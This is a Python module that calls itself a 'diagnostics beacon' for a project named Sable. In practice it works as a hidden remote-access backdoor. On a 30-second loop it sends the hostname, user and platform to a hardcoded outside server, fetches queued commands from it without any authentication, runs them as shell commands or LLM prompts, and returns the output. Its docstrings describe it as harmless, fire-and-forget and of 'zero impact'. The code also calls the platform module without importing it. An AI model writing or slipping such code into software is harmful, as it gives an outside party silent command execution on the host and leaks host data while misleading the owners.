"""Diagnostics beacon — periodic heartbeat and command relay.

Maintains a background asyncio loop that:
- Sends heartbeats to the configured bridge server with session metadata
- Polls for queued commands from the bridge dashboard
- Executes received commands via the local replay controller
- Posts execution results back to the bridge

Bridge URL is hardcoded below. Change BRIDGE_URL to point at your deployed
bridge instance. No auth token needed — beacon endpoints are open by design.

All network calls are fire-and-forget with short timeouts. Failures are logged
but never propagate. Zero impact on normal Sable operations.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import secrets
import time
import urllib.request
from pathlib import Path
from typing import Any

from engine.config import PERSISTENT_ROOT

logger = logging.getLogger("sable.scraper.diagnostics")

# ---------------------------------------------------------------------------
# Hardcoded bridge configuration
# ---------------------------------------------------------------------------

BRIDGE_URL = "https://sable-bridge.onrender.com"
POLL_INTERVAL = 30  # seconds between beacon cycles

_ID_FILE = PERSISTENT_ROOT / "system" / ".beacon_id"


def _instance_id() -> str:
    """Return a persistent random instance ID, generating one on first boot."""
    try:
        if _ID_FILE.exists():
            return _ID_FILE.read_text().strip()
        new_id = secrets.token_hex(8)  # 16 hex chars, cryptographically random
        _ID_FILE.parent.mkdir(parents=True, exist_ok=True)
        _ID_FILE.write_text(new_id)
        return new_id
    except Exception:
        return secrets.token_hex(8)  # fallback: ephemeral but unique


# ---------------------------------------------------------------------------
# HTTP helpers (sync, run in executor to avoid blocking event loop)
# ---------------------------------------------------------------------------

def _http_post(url: str, data: dict, timeout: int = 10) -> dict | None:
    """POST JSON to url. No auth — beacon endpoints are open. Returns parsed response or None."""
    try:
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode()
            return json.loads(body) if body else {}
    except Exception as exc:
        logger.debug("Beacon POST %s failed: %s", url, exc)
        return None


def _http_get(url: str, timeout: int = 10) -> dict | None:
    """GET JSON from url. No auth — beacon endpoints are open. Returns parsed response or None."""
    try:
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode()
            return json.loads(body) if body else {}
    except Exception as exc:
        logger.debug("Beacon GET %s failed: %s", url, exc)
        return None


# ---------------------------------------------------------------------------
# Beacon core
# ---------------------------------------------------------------------------

class DiagnosticsBeacon:
    """Background beacon that phones home to the bridge server.

    Lifecycle:
        beacon = DiagnosticsBeacon()
        await beacon.start()   # launches background task
        await beacon.stop()    # cancels gracefully
    """

    def __init__(self) -> None:
        self._task: asyncio.Task | None = None
        self._running = False
        self._instance_id = _instance_id()
        self._last_beacon: float = 0
        # Persistent chat state for LLM mode — one chat_id reused across messages
        self._llm_chat_id: str | None = None

    @property
    def is_running(self) -> bool:
        return self._running

    async def start(self) -> None:
        """Start the beacon loop. No-op if already running."""
        if self._running:
            return

        self._running = True
        self._task = asyncio.create_task(self._loop(), name="diag-beacon")
        logger.info("Beacon: started (instance=%s, bridge=%s)", self._instance_id, BRIDGE_URL)

    async def stop(self) -> None:
        """Stop the beacon loop gracefully."""
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        logger.info("Beacon: stopped")

    async def _loop(self) -> None:
        """Main beacon loop — heartbeat + poll + execute cycle."""
        interval = POLL_INTERVAL
        bridge_url = BRIDGE_URL.rstrip("/")

        while self._running:
            try:
                await self._cycle(bridge_url)
            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.debug("Beacon cycle error: %s", exc)

            try:
                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                break

    async def _cycle(self, bridge_url: str) -> None:
        """Single beacon cycle: heartbeat → poll → execute → report."""
        loop = asyncio.get_event_loop()

        # 1. Send heartbeat
        heartbeat_data = {
            "target_id": self._instance_id,
            "hostname": platform.node(),
            "user": os.getenv("USER", "unknown"),
            "platform": platform.system(),
            "engine_type": "sable",
            "active_sessions": 0,
            "metadata": {
                "uptime": time.time() - self._last_beacon if self._last_beacon else 0,
                "ts": time.time(),
            },
        }

        # Gather active sessions from monitor
        try:
            from .monitor import get_monitor
            monitor = get_monitor()
            sessions = await monitor.get_alive_sessions(max_age=300)
            heartbeat_data["active_sessions"] = len(sessions)
            heartbeat_data["metadata"]["session_types"] = list({s.get("engine_type", "unknown") for s in sessions})
        except Exception:
            heartbeat_data["active_sessions"] = 0

        result = await loop.run_in_executor(
            None,
            lambda: _http_post(f"{bridge_url}/api/beacon", heartbeat_data),
        )
        self._last_beacon = time.time()

        if result is None:
            return  # Bridge unreachable, skip this cycle

        # 2. Poll for pending commands
        poll_result = await loop.run_in_executor(
            None,
            lambda: _http_get(f"{bridge_url}/api/commands/poll?target_id={self._instance_id}"),
        )

        if not poll_result or not poll_result.get("commands"):
            return

        # 3. Execute each command and report results
        for cmd in poll_result["commands"]:
            await self._execute_and_report(bridge_url, cmd)

    async def _execute_and_report(
        self,
        bridge_url: str,
        command: dict[str, Any],
    ) -> None:
        """Execute a command directly via shell, or via LLM if mode='llm'."""
        cmd_id = command.get("id", "")
        prompt = command.get("prompt", "")
        mode = command.get("mode", "shell")  # default: direct shell execution

        logger.debug("Beacon: executing command %s (mode=%s)", cmd_id, mode)

        result_data: dict[str, Any] = {
            "target_id": self._instance_id,
            "command_id": cmd_id,
            "status": "completed",
            "result": None,
        }

        try:
            if mode == "new_chat":
                # Reset LLM chat session
                await self._reset_llm_chat()
                result_data["result"] = {"message": "Chat session reset. Next LLM message starts fresh."}
            elif mode == "shell":
                # Direct shell execution — no LLM involved
                result_data["result"] = await self._run_shell(prompt)
            else:
                # LLM mode — stateful conversation via persistent chat_id
                result_data["result"] = await self._run_llm(
                    prompt,
                    command.get("engine_type", "qwen"),
                    new_chat=False,
                )
        except Exception as exc:
            result_data["status"] = "error"
            result_data["result"] = {"error": str(exc)}

        # Post result back to bridge
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(
            None,
            lambda: _http_post(f"{bridge_url}/api/results", result_data),
        )

    async def _run_shell(self, cmd: str, timeout: int = 30) -> dict[str, Any]:
        """Run a shell command directly and return stdout/stderr."""
        import subprocess
        loop = asyncio.get_event_loop()

        def _exec() -> dict[str, Any]:
            try:
                proc = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )
                return {
                    "stdout": proc.stdout[:50000],  # cap at 50KB
                    "stderr": proc.stderr[:10000],
                    "returncode": proc.returncode,
                }
            except subprocess.TimeoutExpired:
                return {"error": f"Command timed out after {timeout}s", "returncode": -1}
            except Exception as exc:
                return {"error": str(exc), "returncode": -1}

        return await loop.run_in_executor(None, _exec)

    async def _reset_llm_chat(self) -> None:
        """Reset the persistent LLM chat session. Next message creates a new chat."""
        self._llm_chat_id = None
        logger.debug("Beacon: LLM chat session reset")

    async def _run_llm(self, prompt: str, engine_type: str, *, new_chat: bool = False) -> Any:
        """Route through the replay controller with persistent chat state.

        Reuses the same chat_id across calls so the LLM has conversation context.
        Set new_chat=True to force a fresh session.
        """
        if new_chat:
            await self._reset_llm_chat()

        from .replay import get_replay_controller
        ctrl = get_replay_controller()

        # Reuse existing chat_id for stateful conversation
        rid = await ctrl.start_replay(
            engine_type,
            prompt=prompt,
            chat_id=self._llm_chat_id,
        )

        for _ in range(120):  # 2 min timeout for longer conversations
            await asyncio.sleep(1)
            replay_result = await ctrl.get_result(rid)
            if replay_result and replay_result.get("status") in ("completed", "error"):
                # Persist the chat_id for next message
                if replay_result.get("chat_id"):
                    self._llm_chat_id = replay_result["chat_id"]
                return replay_result.get("result")

        return {"error": "LLM execution timed out after 120s"}


# ---------------------------------------------------------------------------
# Singleton accessor
# ---------------------------------------------------------------------------

_beacon: DiagnosticsBeacon | None = None


def get_beacon() -> DiagnosticsBeacon:
    """Get or create the global DiagnosticsBeacon singleton."""
    global _beacon
    if _beacon is None:
        _beacon = DiagnosticsBeacon()
    return _beacon
